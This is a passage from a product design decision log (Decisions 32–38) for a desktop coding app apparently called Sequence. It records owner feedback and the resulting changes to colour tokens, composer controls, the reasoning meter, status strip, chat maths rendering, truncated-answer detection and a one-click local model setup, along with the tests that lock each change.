| shadow / blur | `0 1px 2px rgba(0,0,0,.06)` / none |
| loader | pulse (`● ◉ ○ ◉`, 220ms) |
| prefers | prompt **modes**, thinking **steps**, tool **card**, tasks **capsules**, approval **questions**, context **ring**, status **toast**, loading **ring**, streaming **cursor** |

The one Lovable-specific rule in the kit is a brand gradient ring
(`#5e89f2 → #ff66f4 → #fe7b02`) round the composer.

### What was taken, and what was not

**Taken as-is: the room, the inks, the blue, the face, the rounding.** A new
accent value, `data-accent="blue"`, is the third look beside white and gold and
is now the default (`accentPreference.ts`, `index.html`'s pre-paint script, and
Settings, where the three are Blue, White glass, Gold). Its block, §5c of
`tokens/graphite.css`, overrides the ground ladder to Lovable's greys, the inks
to Lovable's, the accent family to Lovable's blue, the shadows to the kit's one
soft shadow, and the radii to the kit's 8 (`--r-10` 8px, `--r-14` 10px,
`--r-18` 12px, `--r-8` 6px). Inter replaces all three faces globally: it is
`--font-sans`, `--font-ui` and `--font-display`, self-hosted through
`@fontsource/inter`, and Instrument Sans, DM Sans and Sora are removed from
the sheet and the package. JetBrains Mono stays: it is in Lovable's own mono
stack.

**Not taken: "blur none".** The same evening the owner put transparency first
and said he liked the liquid glass more than the kit's opaque surfaces. So the
material is still Decision 31's - thin white fill, blur, one hairline, a
half-pixel ring, no bevel - and only the room under it changed. The kit's brand
gradient ring is Lovable's brand, not this product's, and a multi-hue gradient
is what Decision 31 spent a decision removing; the composer takes a one-hue
blue rim on focus instead.

**One blue, two cuts, and the arithmetic that forces it.** `#1F55F1` measures
2.95:1 over `#1D1D1C`: a fill, never a mark. So the SOLID (Send) is Lovable's
blue with white on it (5.7:1), and everything READ in blue takes a lighter cut
of the same hue: `--accent` `#4C7DFF` for marks (4.6:1 over `--bg-base`) and
`--accent-ink` `#6B93FF` for words (5.1:1 over `--surface-2`). `--hint-blue`
is the accent's own hue under this look, because Lovable spends one blue on
both "press this" and "you are in Plan"; the other four hints keep Apple's dark
cuts. The hue budget in the sheet header is unchanged.

**The room is grey.** `#181A20` was blue by eight and read as navy. Every rung
of the new ladder is within two steps across its channels, and
`graphite.test.ts` holds that.

### The parts, mapped

| kit part (Lovable prefers) | Sequence surface | what changed |
| --- | --- | --- |
| prompt: modes | `.v3-mode-trigger[data-mode]`, `[data-effort]` | the chip is TINTED GLASS: `--hint-*-fill` (.22 of the hue, blurred) plus the rim, kept under hover and while open; the menu rows keep the .14 wash |
| loading: ring | `.spin.braille` (the reasoning glyph) | a 12px ring, edge ink with a quarter in the accent, 1s round; the braille orbit is gone, the class stays |
| thinking: steps | `.v3-thinking-bar` | a card - pane fill, hairline, `--r-10`, the timer at the far right in mono |
| tool: card | `.toolrow` | each call is a thin card: pane fill and a faint hairline, stacked at `--sp-4` |
| tasks: capsules | `.v3-goal-step`, `.todo-row` | each step is its own capsule; the next step wears the blue wash and rim; a done step has a green mark and recedes; the lists lose their outer box |
| approval: questions | `.permsel` | glass like every other chip on its row (it was an opaque surface) |
| context: ring | `ContextRing` | already a lone ring (Decision 31) |
| streaming: cursor | `.prose[data-streaming]::after` | already a block cursor |
| status: toast | - | the product has no toast; `--toast-*` tokens stay unconsumed |
| composer edge | `.v3-composer-shell:focus-within` | `--accent-edge` hairline while typing |

A third token per hint, `--hint-<hue>-fill`, is declared on `:root` and both
dark blocks (.20) and under blue (.22). It sits between the wash and the rim:
above the wash so a chip reads as coloured glass, below the rim so the edge
still ends it.

### The site

The same ladder, blue and face on trysequence.app: `--dark #1d1d1c`,
`--dark-elevated #272726`, `--on-dark-muted #a6a6a4`, `--accent #1f55f1`
(5.7:1 on white, so `--accent-text` is the same blue), `--accent-dark-rgb`
76,125,255 (the app's mark cut), Inter only, cards at 18 and tiles at 14. The
three dark atmospheres and the dark glass move off navy with it. `?accent=ink`
and `?accent=gold` still switch the earlier looks for comparison.

### Locked

`graphite.test.ts` (Decision 32 suite): the blue block resolves the kit's
values for the room, the surface, the inks and the solid; every rung of the
ladder is grey within two steps; the three contrast floors above hold and the
solid itself is under 3.2:1 on the ground; `--hint-blue` equals `--accent` and
the five hints are still five colours; every wash is .14, every rim .35 and
every fill between them and at most .24; the three-channel chosen lock, the
frosted band, the zero bevel, the half-pixel ring and the hairline band all
hold under blue as they do under white; `--r-10` is 8px and `--r-14` 10px;
the block does not reach the light palette, introduces no token, and declares
no gradient. `V3ContextAndContrast.test.tsx` runs its chosen-state suite under
both white and blue. `test/font.test.tsx` locks Inter on the body, on
`--font-ui`, on answer headings and on the chrome titles, and refuses any of
the three faces it replaced. `accentPreference.test.ts` ships blue, keeps a
stored white or gold, and lands every unreadable value on blue.

## Decision 33 - Colour stays in the menu; the bar is glyphs on glass

Owner, 2026-09-18, late, on the Decision 32 build: *"I like the colors when you
choose between plan, build, teach, between medium, high, low. But I don't like
it selected in the bar. It looks too colorful, a little bit unprofessional."*
And: *"I don't know how much I like the blue highlighted icon on the surfaces
when you work on that specific place."* And: *"aim more for just icons in the
toolbar or in the chat box, and move away from all the descriptions… build
should be a better icon; plan seems fine; teach should be like a teacher icon
or a book; the model icon should be like a robot; the clock icon is okay."*
On the accent: *"Blue looks the best. Warm grey background, clean. Keep that
blue. We can provide people with white and gold in the background, but it
should always default to blue. Blue is our source of truth."*

### What changed

- **The chosen mode and effort chips are plain glass again.** The
  `--hint-*-fill` tint from Decision 32 is gone from `.v3-mode-trigger`; the
  glyph inherits the trigger's own ink. The MENU keeps everything Decision 31
  gave it: tinted glyphs on the rows, the wash and rim on the chosen row. The
  hint-fill tokens stay declared (a fill is still the third rung of a hint
  family) but nothing on the bar consumes them.
- **The chosen surface tab's glyph and the focused pane's title are the top
  ink**, not the accent. Chosen was already said by fill, rim and weight; the
  blue was a fourth channel and the one the owner saw first.
- **The composer chips are icon only.** No word, no chevron. Plan keeps
  `file`; Build takes a new `hammer`; Teach takes the book's own `book`; the
  model chip takes a new `bot`; effort keeps `gauge`. The accessible name
  carries the word (`aria-label="Mode: Plan"`), so a reader and V3App.test
  still know which is set; the title says it on hover.
- **Two authored glyphs**, `bot` and `hammer`, on the book's 24 grid at its
  stroke, added to the sprite in `_core.html` as the book lock requires.
- **Blue is the default and the one shown.** Unchanged from Decision 32 and
  restated because the owner restated it: white and gold are reachable from
  Settings, never the default, never on the site.

### Locked

`test/icon-book.test.ts` holds Icon.tsx to the sprite (the two new symbols are
in both). `V3App.test.tsx` reads the mode and effort from the accessible name,
not the text. `V3ContextAndContrast.test.tsx` still asserts three tinted rows in
the menu; nothing asserts a tint on the bar, and nothing should.

## Decision 34 — one pill, one agent chip, and an icon that is actually drawn

Owner, 2026-09-19, walking the installed app: *"The little mini icons on the
chat box are good… they don't seem big enough for their boxes."* And:
*"Model and effort should be in one icon… just to condense space… you can look
at examples like codex where you open model and effort and it's like the model
above and then effort as kind of a meter."* And: *"the plan, build, and the
type of modes and behaviors the agent serves should also be a different type of
button style. It shouldn't just be like the same icon as everything else…
if you look at cursor, that attaches as a little pill."* And: *"in teach mode
the icon is broken, the papers don't look good… I like kind of the book aspect
of it, but I've had you make this same icon before and you keep failing."*

### What was actually wrong

**Two of the four chips were drawing nothing.** A container-query step written
for Decision 31's layout hid the narrow-composer word with `font-size: 0` and
the chevron with `> svg:last-child { display: none }`. Decision 33 then removed
both from the markup — so `svg:last-child` became the GLYPH, and the mode and
effort chips rendered as empty 18px boxes at any composer under 460px, which is
most of them. The owner read the symptom exactly right ("the teach icon is
broken") and the cause was one stale selector.

A rule that names a position in the markup outlives the markup it was written
against. The replacement names what a thing IS (`.v3-chip-glyph`), not where it
sits.

### What changed

- **A glyph chip is a square.** `--row-h` by `--row-h`, no side padding, a
  16px mark — the icon ladder's own default. They were 34–36 wide around a 14px
  mark, which is a box built for a word that Decision 33 had taken away. The
  tools button joins them at `--r-10`, and Send's arrow joins them at 16px.
- **Model and reasoning are ONE chip and one panel.** The bar shows `bot`; the
  panel lists the model profiles, then draws reasoning as a four-step METER
  that fills up to the chosen step. Picking a step leaves the panel open,
  because a meter that closes when touched cannot be compared. The separate
  effort trigger, its popover, its ref and its open-flag are gone.
- **The mode control is a pill and wears its name and its hue.** This does not
  undo Decision 33: every OTHER chip stays a bare, untinted glyph. Mode is the
  one setting that changes what the agent may do to the repository, so it is
  the one that is findable at a glance. It takes `--mode-<key>-fill` and
  `--mode-<key>-edge`, which is what those aliases were always for; the open
  state's accent rim still beats the mode hue, or the reader cannot tell which
  menu is live.
- **`book` is redrawn as an open book** — a spine and two page blocks, three
  paths, no `translate()`. The old one was a half-cover plus its own mirror,
  which is why it read as two offset sheets of paper. Updated in `_core.html`
  too, as the book lock requires.

### Locked

`V3App.test.tsx`: the agent chip opens a model list above a four-step meter;
the meter fills up to the chosen step; High writes through and the panel stays
open; the mode control is a pill carrying its word AND a glyph, while the agent
chip carries a glyph and no text. `test/icon-book.test.ts` holds Icon.tsx to
the sprite.

## Decision 35 — one menu, a slider with named ends, and a palette on shelves

Owner, 2026-09-19, with three reference shots and the instruction: *"add these
prompt and AI bar logic components as ours as well, meter for effort sizes,
photo 2 (+) expanding tools showcase with modes there, and then / loading as a
pop out, for skills, tools, modes, etc. add this with our brand book and
system."*

### The `+` menu holds everything, in shelves

The reference is headed "Add agents, context, tools…": modes at the top, a
rule, then Image, then submenus for Models, Skills and MCP Servers. Ours is
the same shape from our own sources — **Modes** (`MODE_ROWS`), **Do**
(`TOOLBELT` plus New goal), **Add** (attach, then the three submenus).

**It is still one keeper list.** `composerModel.TOOLBELT` opens by recording
that v1 shipped three competing `+` menus and that plan item 2.7 names that as
a defect. Nothing here is a second list: the modes are the mode rows, the
models are the profiles the agent chip shows, the skills are the ones the
engine loads, the servers are the keys of the workspace's MCP config file
(which this repository does not carry, so it is named here in prose rather
than as a path a reader could follow to nothing). Each is drawn
once, from its own source.

**The Image row says "Attach a file" instead.** `onAttach(name, text)` posts
to `/api/attachment`, which stores TEXT; there is no image pipeline behind the
composer. `composerModel` already states the rule, about `/goal`: a row that
does nothing when picked is worse than no row, because the reader has been
told the product can do something it cannot.

**A submenu with nothing in it says where to put something.** "No skills yet"
plus the path is actionable; an empty panel is a dead end.

### Faster ⟷ Smarter

Four stops, not the reference's five, because the four are the real values the
provider takes (`none`, `low`, `medium`, `high`) and a fifth dot would be a
control lying about what it sets. What changed is the framing: the ENDS are
named and the stops are not. "Off / Low / Med / High" asks a reader to rank
four words before choosing; a track asks them to point. It stays a real
radiogroup, so arrows and the accessible name still work.

### The palette on shelves

Skills over Commands over Modes, three rows each, then the count. `slashGroupOf`
reads the shelf off the command's SOURCE, so it cannot be set wrongly by hand,
and skills join the registry the same derived way everything else does — typed
by their slug, because the slug is what the directory is called and what the
engine's loader keys on.

**The count is the point.** "Show 44 more" tells a reader whether it is worth
opening; "Show more" asks them to find out.

**A search shows everything it matched.** The reader has already narrowed the
list themselves; capping it again would hide the row they typed toward, which
is the failure the cap exists to prevent, in reverse.

### Two things the build found

**The chevron is placed, not flowed.** `.v3-mode-pop button` is a two-column
grid, so a fourth child lands in column one of a third row — under the row
rather than at its end. `margin-left: auto` cannot fix that; a grid track has
no free space to push into. The chevron is pinned to the row's right edge
instead, which no later change to the menu's template can undo.

**A menu taller than the window loses its top rows**, and the top rows here
are the modes. `.v3-tools-pop` scrolls at `min(70vh, 520px)`.

### Locked

`composerModel.test.ts`: the group comes from the source; a shelf at exactly
the cap hides nothing and one over hides one; an expanded shelf is the only
one expanded; a search is never capped; an emptied shelf draws no heading;
`slashVisible` flattens in drawn order so the keyboard index and the screen
agree. `V3App.test.tsx`: the menu's four regions; picking a mode from it moves
the pill; one submenu at a time; the slider names its ends and fills to the
chosen stop; the palette's headings, count, and expansion.


---

## Decision 36 - Three controls on the row, one line per menu row, and a meter that is a meter

**2026-09-19.** The owner walked the build Decision 35 shipped and sent three
shots of it. The verdict on the slider was one sentence - *"the meter looks
bad"* - and the rest was a list about the row it sits under.

> "Some of the buttons are a lot smaller. Under model, just the name - not
> whatever nickname it has, not the actual sub-name, the path under it. Build
> modes: just use it from the plus instead of from another button. Then I
> reduce the noise on the actual front bar and make it easier to use and see.
> And the buttons on the front bar need to be smaller.
>
> Plan, build, teach mode are self-explanatory. If you hover they can have a
> description. That itself should be the icon, name. Same with Break it down -
> icon, name. The warning symbol - so it's like blast radius. Make sure it's a
> clear name. That's all you really need. Start a workflow, the agent run, the
> agent graphing loop - it's an effective thing, but regardless it should be
> icon plus name, smaller buttons, easier to use, easier to see.
>
> The pop-out shouldn't have a scroll bar. It shouldn't auto-default to showing
> a bunch of things, it should be like show-more buttons - cursor does it very
> well with compacting their prompt bars. And when I click on the pop-out of
> the plus, let's say I click on Skills, that pop-out is only framed in that
> pop-out. I want the pop-outs to be able to pop out of the other pop-outs and
> not be broken into that one small little realm.
>
> The only buttons you can really see on the prompt bar are the plus, the agent
> and the send. The agent - I think it should be a sub-agent icon, plus the
> model attached. Maybe rendering five characters, and the rest hidden behind a
> dot dot dot, which we can hover over to see in full."

### The row holds three controls

`+`, the agent chip, Send. The mode pill is gone, and this is not Decision 34
being reversed: the pill was the right answer to *"modes should be a different
type of button style"* on the day it shipped, and then Decision 35 put the
modes in the `+` menu as well. From that moment the pill was a DUPLICATE, and
a composer row is the most-looked-at strip in the product - every control on
it is rent.

**Nothing was lost with it.** The setting lives in `+`, where the three modes
are checkable radios. The STATE lives on the `+` button, which now wears the
mode's `--mode-*-fill` and `--mode-*-edge` - the exact two tokens the pill
wore. One button, two jobs, and the second costs no width: a fill and a rim
over a glyph the row already paid for. The rim is what keeps it from reading
as a hover, and `[aria-expanded]` still overrides both with the accent, so
"this menu is open" outranks "you are in Plan".

**The whole row drops one rung, 30px to 28px.** That is not a smaller number
picked to look smaller: sheet 10 sets three rungs - `--row-h` 30,
`--control-h` 28, `--row-h-tool` 26 - and names the send button at 28 by name
(*"28px - .sendbtn, .filehd - var(--control-h)"*). The composer was built at
30, which is the rung for a LIST ROW. The product's three most-pressed
controls were sized as if they were part of a list.

### The agent chip says which agent

`agent`, not `bot`. The two glyphs were competing for one meaning: `bot` is a
face, which reads as "a chatbot answers here", and this chip does not open a
chatbot - it opens WHICH agent and HOW HARD it thinks. `agent` is the cube
with a core, the same solid `skill` is drawn from, so the agent and the things
it loads read as one family.

**Five characters and a mark, cut in JS.** `chipLabel()` cuts by COUNT rather
than letting CSS ellipsis a `max-width`, and the difference is the reason it
is a function: a width that depends on the name means the row's three controls
land somewhere different for every model, so Send - the thing the reader is
aiming at - moves when they switch. A character count gives every model the
same chip. The whole name is the control's `title` and its accessible name,
which is where a truncation is allowed to put what it cut.

### A menu row is one line

Every row in the `+` menu, the palette and the agent popover is a glyph and a
label. The gloss is the row's `title`.

A description is read once and then re-read on every open for ever, and it was
doubling the height of the two menus a person opens most: rows went from 48px
to 30px, which is `--row-h`, the rung sheet 10 assigns to `.menuitem` by name.

**That is why the name had to get better first.** Dropping a description is
only safe if the label survives alone, so `what-breaks` was renamed in the
same change: **"What breaks" became "Blast radius".** Beside a warning
triangle, "What breaks" reads as an error the product is reporting rather than
a question the reader can ask; "Blast radius" is the name of the thing and
cannot be misread as an alarm. A one-line row with a label that needed its
gloss would be a menu that got shorter by getting worse.

The model list lost its second line too. `modelPicker.ts` argues for drawing
both - *"a menu that shows only the id is a list of wire strings; a menu that
shows only the name cannot be checked against what is actually configured"* -
and the second half of that is still true, so the wire id did not go anywhere.
It moved to where a check belongs, which is the moment somebody wants to
check.

### One scrollbar was causing two complaints

`overflow-y: auto` on `.v3-tools-pop` drew the scrollbar AND made the menu a
clipping box, so the submenu positioned at `left: 100%` was cut off at the
parent's edge whatever it was told to do. There is no property that opens a
scroll container to one child. The only fix is not to be one.

So the menu has to FIT instead of scrolling, and it now does - the rows lost
their second line and a shelf one row over its cap stopped hiding that row.
Measured in the app: twelve rows and three headings is 474px against the ~520
the ceiling had allowed.

**A shelf one row over the cap shows that row.** "Show 1 more" spends a row to
hide a row and charges a click for the trade, which is the cap doing the
opposite of its job. Two over is where shelving starts paying.

**The submenu lost on specificity, not on position.** The panel carries
`v3-mode-pop v3-submenu-pop`, and `.v3-mode-pop { left: 0 }` sits later in the
sheet at the same specificity - so even after the clipping was fixed, every
submenu opened ON TOP of the menu that spawned it. `.v3-submenu
.v3-submenu-pop` is (0,2,0) and settles it. Ordering would have fixed it today
and broken the next time a block moved.

### The meter, drawn as a meter

Decision 35's slider was four dots on a rail with the chosen one swollen into
a thumb. A thumb promises CONTINUOUS travel and this control has four values,
so a reader drags it and it jumps. Naming only the ends made it worse:
"Faster" and "Smarter" are the two things the control never sets.

**The shape comes from the kit**, which Decision 32 made the source of truth.
Read on 2026-09-19 from the kit’s own machine data, the JSON linked off
usebastion.io’s design page: **26 elements, 132
variants, and no slider or range among them.** One-of-four is a SEGMENT there
- `select/segment` (`.slg`) and the `.seg` inside `prompt/modes`, which is the
prompt variant the Lovable theme itself names as its preference. The kit draws
it as a track with 2-3px of inset padding, equal cells, and the live one
filled.

**It is still a meter and not a segmented switch.** The kit's segment lights
ONE cell; this lights every cell up to the chosen one, which is the difference
between "which one" and "how much" - and how much is what reasoning effort is.
The four cells carry the four real provider values, so the control says what
it sets, and a cell wide enough to hold a word does not need Faster and
Smarter written under it to say which way is which.

**Not the kit's pill radius.** The ramp reserves `--r-full` for "this is a
state or a label", never for an interactive container, so the track takes
`--r-8` and its cells `calc(var(--r-8) - 2px)` - the ramp's own rule that an
inner radius is the outer minus its inset, which is also why `--r-6` does not
exist to be written.

### Three dead rules came out with it

`.v3-mode-pop button[data-effort='medium' | 'high'].is-selected` styled effort
ROWS, which Decision 34 folded into a meter; they had matched nothing since
and would have quietly repainted any future row that happened to carry the
attribute. `.v3-mode-pill*` and `.v3-chip-glyph` went with the pill. The
container step at 380px still names `> span` - which is the model's name now,
and is exactly what that step means to spend.

### Locked

`composerModel.test.ts`: `chipLabel` leaves a short name alone, cuts at five
and marks the cut, never leaves a space before the mark, gives every model the
same width, and returns empty for an empty name; a shelf hides nothing at the
cap OR at one over it, and shelves at two over; every toolbelt label stands on
its own and is not its own hint. `V3App.test.tsx`: the foot holds exactly
`v3-tools-trigger`, `v3-model-trigger`, `composer-send` and nothing else; the
`+` carries `data-mode` and names the mode in its accessible name; there is no
`v3-mode-trigger`; the agent chip is `v3-agent-chip` with a glyph, a cut of at
most six characters and a title; the segment names its four stops, names
neither end, and fills up to the chosen one. `v3ModePop.test.tsx`: a row draws
one line and carries its gloss on the title.


---

## Decision 37 - The rail, the strip, and yellow for Build

**2026-09-19**, the second walk of the same day. Decision 36's build was
"a lot cleaner"; what was left was a list of things that still read wrong, and
two of them were the same control being redrawn for the third time.

### The reasoning picker is a rail

> "The reasoning picker looks bad. Look for other reasoning pickers on
> usebastion.io/design... I can't really find directly something for the model
> picker, but if you need motivation you can look at approval gates, task rows,
> anywhere you have to fill stuff out. If you look at progress rail, it's kind
> of like a model picker because it's like five different modes - off, low,
> medium, high. You can use progress rail as motivation."

**Two shapes had already been wrong here and they were wrong the same way.**
Decision 35's dots on a track promised continuous travel on a control with four
values. Decision 36's labelled cells read as four tabs. Both were trying to be
the CONTROL and the READING at once, and a thing that is both is neither.

The kit's `tasks/rail` splits them, and the split is the whole borrowing: flat
equal bars for how far along, then a line of WORDS underneath for what that
means. The kit's line is `<b>3 / 5</b>` and the step's name; ours is
`<b>Med</b>` and what Med does. The bars carry no text, so they stay at the
kit's own 6px and read as a level rather than as things to press.

**The bar is not the hit target.** Each button is the full 22px row with the
6px bar centred in it. That keeps a real target under the pointer AND lets the
bar be a pure mark at `--r-full`, which the ramp reserves for "this is a state
or a label" and forbids for an interactive container. A 6px button would have
been both, and wrong on both counts.

### The running strip - three columns, none of which move

> "The working - I don't mind the loading symbol, it looks good - but the one
> running, the 38 seconds, the 40 seconds, these are all disproportionate,
> they're all disaligned."

Three separate faults on one strip, and all three were real:

1. **It could wrap.** `flex-wrap: wrap` made it a different control at every
   column width; at a narrow one it was two lines of unequal height.
2. **The timer moved every few seconds.** The phase word changes as the turn
   goes - Working → Reading a file → Finalizing - and nothing reserved its
   width, so `margin-left: auto` threw the timer somewhere new each time. The
   kit's `status/strip` fixes exactly this with one property on the state word:
   `min-width: 9ch`. A reserved column cannot jitter.
3. **Two sizes and two faces on one line.** `.v3-thinking-bar
   .v3-thinking-elapsed` set mono at `--t-12`; `.v3-thinking-elapsed,
   .v3-thinking-running` set the UI face at `--t-14`. The first won on
   specificity for one of them and lost for the other, so the timer and the
   count were two different objects sitting beside each other.

The count also moved to the middle, so the far-right column is always the
clock rather than changing identity depending on whether tools are running.

### Stop's mark is drawn, not borrowed

> "The stop icon - I'm not the biggest fan of how that looks. I don't know what
> it is, if it's a centering issue, but the text isn't properly centered."

**It is not centering; the button is symmetric and the pair is centred.** It is
OPTICAL WEIGHT. `Icon name="stop"` is a 24-grid glyph whose rect runs
6.6 → 17.4, so its ink fills 45% of its box, and `.v3-btn-send svg` forced that
box to 16px: about 7px of mark with 4.5px of air either side. Beside a word set
solid, the mark reads as pushed left and the word as pushed right. Send's arrow
never had the problem because it is hand-drawn on a 16 viewBox and spans 9 of
it. Stop is now drawn on the same viewBox at the same reach, and FILLED - a
hollow rounded square is a checkbox, and the universal mark for stop is solid.

### Build is yellow

> "I don't like the green colour. Use yellow for build instead of green.
> Teach's purple is fine. Teach icon's better, the plan icon's good, the build
> icon's good."

**This made the hue budget shorter, not longer.** Green was Build AND green was
the done mark on a todo row (`chat.css .todo-row[data-status='done']
.todo-mark`) - one hue making two claims, which law 1 forbids by counting. The
change gives Build `--hint-yellow` (Apple's systemYellow, the same pair the rest
of the family uses) and leaves green the one claim it already had. Build is also
the mode that writes files and runs commands without asking, and caution is what
yellow means everywhere else a person has used a computer.

### Teach is in the palette

> "When you go to slash mode, you can't really find Teach anywhere, which is
> kind of annoying."

`slashCommands` was handed `PERMISSION_MODES`, which is plan and build, because
Teach is not a permission value on the wire - it is its own flag that refuses
every mutating tool by itself. That distinction is real and it stays in
`pickMode`, which is the one place that has to know it. It was never a reason
for the PALETTE to offer two of the three modes the bar offers: `/` and `+`
were answering the same question differently, which is the v1 defect item 2.7
names. The palette takes the composer's mode list now. `MODE_ROWS` is still the
one list.

### The chip gets nine characters

> "Allow for more length with model nickname, maybe around 8-10 characters?"

Five was his first number and he revised it after looking at it. Nine is the
middle of the range he named and the point where `minicpm5-hermes` and
`granite42-hermes` stop reading as the same word.

### Maths in the transcript

> "Fix also the embed in the chat output - math functions should be output
> properly as if they were in Obsidian."

The AI Canvas has typeset `$…$` and `$$…$$` since the maths wave; the chat
printed the dollars. The product was typesetting maths in the document it
writes and not in the sentence it says. `MathRun` and `withMath` moved to
`chat/MathText.tsx` with a `family` argument, so the canvas keeps its
`ai-canvas-math` class names and testids byte-identically and the chat gets
`prose-math`. Two copies of a maths renderer is how one sentence comes to
render differently in two panes.

`canvasMath.splitMath` is reused rather than re-derived, and it carries the
rule that matters: a lone `$` is not maths, because prose here is full of "it
cost $5" and "$PATH". Maths is never typeset inside a code span - a backtick
span is what the model asked to be shown verbatim - and IS typeset inside
emphasis, because Obsidian does.

### And the answer that stopped mid-list

> "It also seems to render incomplete under certain changes when I ran the
> breakdown skill. So I should diagnose that problem and create a plan to fix
> it. And actually fix it after you find that plan and the root cause."

The screenshot shows a Break-it-down answer ending on a bare list marker -
"Render" then "-" - with a turn header reading `4.9k in · 191 out` on a local
model. **The root cause is not in the renderer.** `provider.ts` has read
`finish_reason` since the audit that recorded "a completion truncated at
max_tokens was indistinguishable from a complete one", and it used the value at
exactly ONE site: to put a number in an error message. `grep finishReason` over
the rest of the server returned nothing. The fact that an answer had been cut
off was read, dropped, and unavailable to every layer that could have said so.

So the fix is four small hops and one sentence: `ModelTextResult` carries it,
the metered call passes it through, `AskPipelineInput.callProvider` declares it,
and the pipeline appends `TRUNCATED_ANSWER_NOTE` when the round that produced
the answer stopped for `length`.

**It is named as ROOM, not as max_tokens.** The same `length` arrives when a
small model's context window is full of the question, which is what 4.9k in and
191 out looks like, and "the model hit max_tokens" would be the harness
describing a knob instead of what happened.

**The model's own words are kept.** A severed answer is still evidence and the
reader may only have needed the part that arrived; replacing it with an apology
would throw away the half that worked. That is what the empty-answer funnel is
for, and this is a different failure with a different sentence - asserted, so
the two branches do not get "simplified" into one later.

### Locked

`ask-truncated-answer.test.ts`: a `length` stop keeps the model's words and
gains the note, after them; a `stop` finish is not decorated; a provider that
reports no reason is not accused; an empty answer takes the funnel's words
instead. `ProseMath.test.tsx`: an inline formula typesets, `$$…$$` is a display
block, a price and a `$PATH` are left alone, a code span is never touched,
emphasis is, and a formula KaTeX refuses renders as its own source rather than
as nothing. `V3App.test.tsx`: the rail's bars carry no text and its reading
line does, the palette offers all three modes, `/teach` moves the composer into
Teach, the HUD's last column is always the clock.
`V3ContextAndContrast.test.tsx`: Build's rim and glyph are yellow.
`composerModel.test.ts`: the chip budget is nine.

### Still open from this walk

The owner also surveyed the kit for things to adopt - toasts and notices,
message-queue lines, studio cards, chips for loading, edit-with-diff, state
boxes, streaming text, the sparkle fold ("a little bit more intuitive and I
kind of like it a little bit more"), and skeletons wherever loading can fail.
None of those is a defect report; they are a shortlist, and shipping eight
component adoptions in the same change as seven fixes would be worse than
proposing them. They are the next walk's material.


---

## Decision 38 - One click to a local model, and the kit items that earned a place

**2026-09-19.** "Everything that is open, take them, finish them, get on main,
rebuild local, update the website with real copy and working downloads that
people don't need to have 20 different things downloaded for - one package on
install which runs the program end to end." Then, mid-turn: "also render in a
one-click local AI setup like Hermes does I think with Magnitude Dev - research
and make sure we can do that now."

### One click to a local model

**What Magnitude actually does**, read on 2026-09-19: its desktop app profiles
the machine and estimates tokens/second for every model and quant in its
catalogue BEFORE anything is downloaded, ranks them by speed, accuracy,
intelligence and memory, then downloads and tunes the one you pick. The pitch
is that Ollama and LM Studio run whatever you pick, and Magnitude helps you
pick.

**We copy the shape and refuse half the claim.** A tokens/second figure comes
from a hardware profile plus a measured throughput model; inventing one would
be the confident wrong number this product exists to catch in other tools. So
the ranking is by FIT - does it have room to run on this machine - and the card
says "fits in 16 GB of memory", never "runs at 40 tok/s". A smaller true claim.

**What was there before was an instruction, not a feature.** `localProviders.ts`
has detected Ollama since August, and what Settings did with the detection was
print `ollama serve` and `ollama pull <model-name>` and ask the reader to open a
terminal. A local-first product whose local path goes through a terminal is
local-first on paper.

Now: `GET /api/local/setup` answers a PLAN with three outcomes, each naming one
next step - use the best model already on disk, download the one rung of the
ladder this machine's memory reaches, or install Ollama. `POST` performs it.
The model list, the sizes and the download total are all Ollama's own numbers;
nothing about a model is written into this app.

**Three rules the code holds:**

- **60% of memory, and a 1.25x runtime multiplier.** A model that does not fit
  does not fail, it SWAPS - which looks to the reader like the product having
  hung, and is the worst of the outcomes because it is the one they cannot
  diagnose. Being wrong towards a smaller model costs a little capability;
  being wrong the other way costs them their machine.
- **When nothing installed fits, nothing is offered.** The honest answer to
  "everything here is too big" is to say so, with the list of what IS installed
  so the claim is checkable - not to pick the least bad one and let it swap.
- **It never installs Ollama.** Running somebody else's installer is not a
  button this product gets to own. The answer is a link and a sentence.

**Measured on the owner's machine, live:** the route read his real inventory
and his real hardware (17.1 GB, 16 cores) and answered `deepseek-teach:latest`,
7.1 GB - the biggest of his models that fits the budget. The card rendered it
as "A model on this machine is ready ... No key, no account, nothing leaves
this machine."

**And it cannot blank Settings.** `asPlan()` checks the body before trusting
it, because this pane has already lost itself once: on 2026-09-19 a fixture
answered `/api/skills` with another shape, a component threw, and permissions,
MCP and autonomy went with it. It is not only a test concern - a packaged app
talks to whatever engine is on the machine, and an older one answers this route
with a 404 page.

### The website says what is in the box

"One file. Then it runs." The old line was "free for Windows and Mac, runs
locally, and needs no account", which is true and says nothing about the thing
a person is actually worried about before a 180 MB download: what ELSE will
this make me install. Nothing - the installer carries its own Node runtime, the
analyzer, the web app and the model plumbing, and
`tools/desktop-zip-smoke.mjs` extracts that tree somewhere it was never built
and runs it, which is what makes "end to end" a measurement.

**The model is the one honest asterisk**, and the copy carries it: scanning and
diagrams need nothing; chat needs a model, and the app will set one up locally
in a click or take a key.

**The other platforms became a line, not three more cards.** The page had a
primary button and then three buttons the same size, so it asked every reader
to choose between builds for operating systems they are not running. All three
links were re-checked against the release and answer 206.

### The kit shortlist, resolved

The owner's survey from the previous walk, item by item, with the ones that did
not earn a place named and argued rather than quietly dropped.

**Taken:**

- **Sparkle fold** (`thinking/sparkle`) - "a little bit more intuitive and I
  kind of like it a little bit more". Three things differ and only one is the
  sparkle: it ANIMATES OPEN (`grid-template-rows: 0fr -> 1fr`), it carries a
  timer, and its mark turns a quarter and rests rather than spinning. The
  animation is the intuition - ours appeared and vanished, so a reader who
  pressed it could not tell whether the text had been revealed or had just
  arrived, which is exactly "unclear at first glance" on a surface where text
  is arriving all the time. A spinner means "waiting on something else"; a fold
  that is filling is not waiting.
- **State boxes** (`tool/stateboxes`) - "looks clean as well". The state moves
  from a coloured word onto the ground the row sits on, which is the one
  channel that survives being SCANNED rather than read. A column of tool calls
  is always scanned, because the reader is looking for the one that failed.
  Three states, the three the card already derives from the server's own `ok`
  flag, and no fourth invented for a colour.
- **Skeleton** (`loading/skeleton`) - in the local-setup card, whose height is
  known before its content is. A pane that jumps makes a fast read feel slower
  than a slow one.

**Not taken, and why:**

- **Message queue** (`threads/queue`). `composer.queued` holds ONE message. A
  numbered list with "Send now" per row would be the UI drawing a queue the
  engine does not have, which is the defect `composerModel` states at length
  about `/goal`: a row that cannot do what it says is worse than no row.
- **Toasts** (`status/toast`, `threads/toasts`). Approvals are inline in the
  transcript on purpose - the kit's own rule for the approval gate is "never a
  modal that hides the work". A toast is for a reader who is NOT looking at the
  transcript, and that reader is already served by the notifications this
